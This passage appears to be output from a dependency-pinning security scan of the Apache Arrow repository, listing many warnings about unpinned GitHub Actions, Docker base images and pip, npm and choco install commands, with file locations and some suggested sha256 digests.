                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/archery.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/archery.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/archery.yml:68: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/archery.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:192: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:248: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:260: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:275: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:346: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:367: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:445: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/cpp.yml:449: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:457: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/cpp.yml:479: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/cpp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:65: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:89: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/csharp.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/csharp.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/dev.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/dev.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/dev.yml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/dev.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/java.yml:155: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/java.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/java.yml:160: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/java.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/java.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/java.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/java.yml:129: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/java.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:103: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:130: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:134: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/js.yml:140: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/js.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:76: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:89: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:101: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:137: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:149: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:159: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:163: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/matlab.yml:180: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/matlab.yml:196: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/matlab.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python.yml:181: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/python.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python.yml:186: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/python.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python.yml:208: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/python.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:103: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/r.yml:269: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/r.yml:278: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:285: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/r.yml:325: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/r.yml:340: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:350: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/r.yml:354: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/r.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release_candidate.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/release_candidate.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:151: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:176: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:247: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ruby.yml:252: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:259: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:283: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:367: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruby.yml:392: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/arrow/ruby.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: ci/docker/almalinux-8-verify-rc.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/alpine-linux-3.16-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/centos-7-cpp.dockerfile:18: pin your Docker image by updating centos:centos7 to centos:centos7@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-cpp.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-integration.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-cpython-debug.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-cython2.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-dask.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-emscripten.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-hdfs.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-jpype.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-pandas.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-spark.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python-substrait.dockerfile:22",
                        "Warn: containerImage not pinned by hash: ci/docker/conda-python.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/conda.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/debian-12-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/debian-12-js.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/fedora-39-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/java-jni-manylinux-201x.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-c-glib.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-docs.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-lint.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-lint.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-python-3.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-python-313-freethreading.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-r.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-apt-ruby.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-dnf-python-3.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/linux-r.dockerfile:22",
                        "Warn: containerImage not pinned by hash: ci/docker/python-free-threaded-wheel-manylinux-test-imports.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/python-free-threaded-wheel-manylinux-test-unittests.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/python-sdist.dockerfile:18: pin your Docker image by updating amd64/ubuntu:20.04 to amd64/ubuntu:20.04@sha256:10ce2724e9d27deaba0e1a8a6061e77955ca6385d6abb9fdec90d6094844cc52",
                        "Warn: containerImage not pinned by hash: ci/docker/python-wheel-manylinux-test.dockerfile:20",
                        "Warn: containerImage not pinned by hash: ci/docker/python-wheel-manylinux.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/python-wheel-windows-test-vs2019.dockerfile:23: pin your Docker image by updating abrarov/msvc-2019:2.11.0 to abrarov/msvc-2019:2.11.0@sha256:164aabdb3f9dbef34bf558703de6b8936aa84e66553778192334cb3b8ba40a6e",
                        "Warn: containerImage not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:23: pin your Docker image by updating abrarov/msvc-2019:2.11.0 to abrarov/msvc-2019:2.11.0@sha256:164aabdb3f9dbef34bf558703de6b8936aa84e66553778192334cb3b8ba40a6e",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-20.04-cpp-minimal.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-20.04-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-20.04-verify-rc.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-22.04-cpp-minimal.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-22.04-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-22.04-csharp.dockerfile:21",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-22.04-verify-rc.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-24.04-cpp-minimal.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-24.04-cpp.dockerfile:19",
                        "Warn: containerImage not pinned by hash: ci/docker/ubuntu-swift.dockerfile:18: pin your Docker image by updating swift:5.9.0 to swift:5.9.0@sha256:a13d1eff9d1639c967c2c1f28740328f57cde4caaf979d07e86811cbaefdd84d",
                        "Warn: containerImage not pinned by hash: cpp/examples/minimal_build/minimal.dockerfile:18: pin your Docker image by updating ubuntu:focal to ubuntu:focal@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: cpp/examples/minimal_build/system_dependency.dockerfile:18: pin your Docker image by updating ubuntu:focal to ubuntu:focal@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: cpp/examples/tutorial_examples/tutorial.dockerfile:18: pin your Docker image by updating ubuntu:focal to ubuntu:focal@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: dev/release/binary/Dockerfile:18: pin your Docker image by updating debian:bookworm to debian:bookworm@sha256:e11072c1614c08bf88b543fcfe09d75a0426d90896408e926454e88078274fcb",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-apt-source/apt/debian-bookworm/Dockerfile:18: pin your Docker image by updating debian:bookworm to debian:bookworm@sha256:e11072c1614c08bf88b543fcfe09d75a0426d90896408e926454e88078274fcb",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-apt-source/apt/debian-trixie/Dockerfile:18: pin your Docker image by updating debian:trixie to debian:trixie@sha256:4bf4a3ee5cd9a4a6bc048af9bf7c0666f761e391e7ebb158b3da554ffe75994e",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-apt-source/apt/ubuntu-focal/Dockerfile:18: pin your Docker image by updating ubuntu:focal to ubuntu:focal@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-apt-source/apt/ubuntu-jammy/Dockerfile:18: pin your Docker image by updating ubuntu:jammy to ubuntu:jammy@sha256:0e5e4a57c2499249aafc3b40fcd541e9a456aab7296681a3994d631587203f97",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-apt-source/apt/ubuntu-noble/Dockerfile:18: pin your Docker image by updating ubuntu:noble to ubuntu:noble@sha256:99c35190e22d294cdace2783ac55effc69d32896daaa265f0bbedbcde4fbe3e5",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/almalinux-8/Dockerfile:18: pin your Docker image by updating almalinux:8 to almalinux:8@sha256:d7dbaf57916185b2be09e1eaa1156b543f3937164ffa08d7fdc020a0a3800a5a",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/almalinux-9/Dockerfile:18: pin your Docker image by updating almalinux:9 to almalinux:9@sha256:1c718a4cd7bab3bdb069ddbbd1eb593a390e6932d51d0048a2f6556303bafba7",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/amazon-linux-2023/Dockerfile:18: pin your Docker image by updating amazonlinux:2023 to amazonlinux:2023@sha256:5bf4cf420ef7e50835911993c6a2ddb0e8f5101c0ef89ca20e9d02a03c8c3a8c",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/centos-7/Dockerfile:18: pin your Docker image by updating centos:7 to centos:7@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/centos-8-stream/Dockerfile:18: pin your Docker image by updating quay.io/centos/centos:stream8 to quay.io/centos/centos:stream8@sha256:20da069d4f8126c4517ee563e6e723d4cbe79ff62f6c4597f753478af91a09a3",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow-release/yum/centos-9-stream/Dockerfile:18: pin your Docker image by updating quay.io/centos/centos:stream9 to quay.io/centos/centos:stream9@sha256:e5fdd83894773a25f22fbdf0b5253c63677d0cbaf8d3a8366b165a3ef5902964",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/debian-bookworm/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/debian-trixie/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/ubuntu-focal/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/ubuntu-jammy/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/ubuntu-noble/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/almalinux-8/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/almalinux-9/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/amazon-linux-2023/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/centos-7/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/centos-8-stream/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: dev/tasks/linux-packages/apache-arrow/yum/centos-9-stream/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: python/examples/minimal_build/Dockerfile.fedora:18: pin your Docker image by updating fedora:39 to fedora:39@sha256:f23412a1ad7c430fc5ed9c029b15715aed3d50e6322902a066869310cddaf915",
                        "Warn: containerImage not pinned by hash: python/examples/minimal_build/Dockerfile.ubuntu:18: pin your Docker image by updating ubuntu:jammy to ubuntu:jammy@sha256:0e5e4a57c2499249aafc3b40fcd541e9a456aab7296681a3994d631587203f97",
                        "Warn: downloadThenRun not pinned by hash: ci/docker/conda-integration.dockerfile:47-50",
                        "Warn: downloadThenRun not pinned by hash: ci/docker/conda-integration.dockerfile:73",
                        "Warn: pipCommand not pinned by hash: ci/docker/conda-python-emscripten.dockerfile:35-36",
                        "Warn: pipCommand not pinned by hash: ci/docker/conda-python-emscripten.dockerfile:35-36",
                        "Warn: npmCommand not pinned by hash: ci/docker/linux-apt-docs.dockerfile:27-81",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-apt-docs.dockerfile:114-117",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-apt-python-3.dockerfile:27-32",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-apt-python-3.dockerfile:27-32",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-apt-r.dockerfile:91-94",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-apt-r.dockerfile:91-94",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-dnf-python-3.dockerfile:29",
                        "Warn: pipCommand not pinned by hash: ci/docker/linux-dnf-python-3.dockerfile:35-37",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-free-threaded-wheel-manylinux-test-unittests.dockerfile:45-49",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-free-threaded-wheel-manylinux-test-unittests.dockerfile:50",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-free-threaded-wheel-manylinux-test-unittests.dockerfile:51",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-sdist.dockerfile:34",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-wheel-manylinux-test.dockerfile:25",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-wheel-manylinux.dockerfile:118-120",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-wheel-manylinux.dockerfile:123",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-test-vs2019.dockerfile:44",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-test-vs2019.dockerfile:60-61",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-test-vs2019.dockerfile:60-61",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:27-28",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:27-28",
                        "Warn: chocoCommand not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:88",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:89",
                        "Warn: pipCommand not pinned by hash: ci/docker/python-wheel-windows-vs2019.dockerfile:92",
                        "Warn: pipCommand not pinned by hash: dev/tasks/linux-packages/apache-arrow/apt/ubuntu-focal/Dockerfile:30-81",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/Dockerfile.fedora:33",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/Dockerfile.ubuntu:39",
                        "Warn: npmCommand not pinned by hash: ci/scripts/install_azurite.sh:37",
                        "Warn: chocoCommand not pinned by hash: ci/scripts/install_azurite.sh:41",
                        "Warn: npmCommand not pinned by hash: ci/scripts/install_azurite.sh:42",
                        "Warn: npmCommand not pinned by hash: ci/scripts/install_azurite.sh:45",
                        "Warn: downloadThenRun not pinned by hash: ci/scripts/install_conda.sh:38",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_dask.sh:30",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_dask.sh:31",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_dask.sh:33",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_dask.sh:35",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_dask.sh:40",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_numba.sh:34",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_numba.sh:36",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_numba.sh:38",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_numpy.sh:30",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_numpy.sh:32",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:31",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:33",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:35",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:39",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:41",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:43",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_pandas.sh:45",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_substrait_consumer.sh:29",
                        "Warn: pipCommand not pinned by hash: ci/scripts/install_substrait_consumer.sh:32",
                        "Warn: pipCommand not pinned by hash: ci/scripts/integration_arrow.sh:38",
                        "Warn: pipCommand not pinned by hash: ci/scripts/integration_arrow.sh:44",
                        "Warn: pipCommand not pinned by hash: ci/scripts/integration_arrow.sh:47",
                        "Warn: pipCommand not pinned by hash: ci/scripts/integration_skyhook.sh:126",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_benchmark.sh:26",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_macos_build.sh:55",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_macos_build.sh:58",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_macos_build.sh:60",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_macos_build.sh:64",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_unix_test.sh:62",
                        "Warn: pipCommand not pinned by hash: ci/scripts/python_wheel_unix_test.sh:98",
                        "Warn: pipCommand not pinned by hash: dev/conbench_envs/hooks.sh:42",
                        "Warn: pipCommand not pinned by hash: dev/conbench_envs/hooks.sh:78",
                        "Warn: npmCommand not pinned by hash: dev/release/setup-rhel-rebuilds.sh:54",
                        "Warn: downloadThenRun not pinned by hash: dev/release/verify-release-candidate.sh:319",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:517",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:526",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:726",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:757",
                        "Warn: npmCommand not pinned by hash: dev/release/verify-release-candidate.sh:871",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:894",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:895",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:1063",
                        "Warn: pipCommand not pinned by hash: dev/release/verify-release-candidate.sh:1104",
                        "Warn: downloadThenRun not pinned by hash: python/examples/minimal_build/build_conda.sh:39",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/build_conda.sh:101",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/build_venv.sh:37",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/build_venv.sh:38",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/build_venv.sh:73",
                        "Warn: pipCommand not pinned by hash: python/examples/minimal_build/build_venv.sh:77",
                        "Warn: pipCommand not pinned by hash: .github/workflows/archery.yml:73",
                        "Warn: pipCommand not pinned by hash: .github/workflows/archery.yml:75",
